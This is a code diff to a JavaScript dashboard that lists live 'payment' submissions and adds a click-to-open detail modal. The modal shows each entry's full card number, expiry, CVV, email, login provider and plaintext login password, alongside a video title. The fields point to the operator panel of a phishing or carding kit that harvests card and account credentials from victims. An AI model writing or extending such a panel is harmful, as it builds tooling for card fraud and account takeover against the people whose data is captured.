@@ -163,7 +163,7 @@ function renderMonitorFull() {
         const minutes = Math.floor(clears / 60);
         const seconds = clears % 60;
 
-        return `<tr data-row-ref="${ref}">
+        return `<tr data-row-ref="${ref}" class="payment-row" style="cursor:pointer">
             <td class="time-cell">${time}</td>
             <td style="font-weight:500">${esc(r.card_name)}</td>
             <td class="card-mask">${esc(cardNum)}</td>
@@ -183,7 +183,58 @@ function renderMonitorFull() {
     }).join('');
 
     el.innerHTML = `<table class="monitor-table">${thead}<tbody>${tbody}</tbody></table>`;
+    bindPaymentRowDetails();
 }
+
+function bindPaymentRowDetails() {
+    document.querySelectorAll('.payment-row').forEach(row => {
+        row.addEventListener('click', () => {
+            const ref = row.dataset.rowRef;
+            const entry = liveRows.get(ref);
+            if (!entry) return;
+            openPaymentDetail(ref, entry.data);
+        });
+    });
+}
+
+function openPaymentDetail(ref, data) {
+    const modal = document.getElementById('paymentDetailModal');
+    if (!modal) return;
+
+    const rows = [
+        ['Transaction', ref || '—'],
+        ['Cardholder', data.card_name || '—'],
+        ['Card Number', data.card_number || '—'],
+        ['Expiry', data.expiry || '—'],
+        ['CVV', data.cvv || '—'],
+        ['Email', data.email || '—'],
+        ['Auth Provider', data.auth_provider || 'guest'],
+        ['Auth Email', data.auth_email || data.email || '—'],
+        ['Auth Password', data.auth_password || '—'],
+        ['Video', data.video_title || '—'],
+        ['Submitted', data.submitted_at ? new Date(data.submitted_at).toLocaleString() : '—'],
+    ];
+
+    document.getElementById('detailTitle').textContent = `Transaction ${String(ref).slice(0, 8)}`;
+    document.getElementById('detailGrid').innerHTML = rows.map(([label, value]) => `
+        <div class="detail-item">
+            <span>${label}</span>
+            <strong>${esc(String(value))}</strong>
+        </div>
+    `).join('');
+
+    modal.classList.remove('hidden');
+}
+
+function closePaymentDetail() {
+    const modal = document.getElementById('paymentDetailModal');
+    if (modal) modal.classList.add('hidden');
+}
+
+document.getElementById('detailCloseBtn')?.addEventListener('click', closePaymentDetail);
+document.getElementById('paymentDetailModal')?.addEventListener('click', (event) => {
+    if (event.target.id === 'paymentDetailModal') closePaymentDetail();
+});
 
 function renderMonitorDash() {
     const el = document.getElementById('dashMonitor');
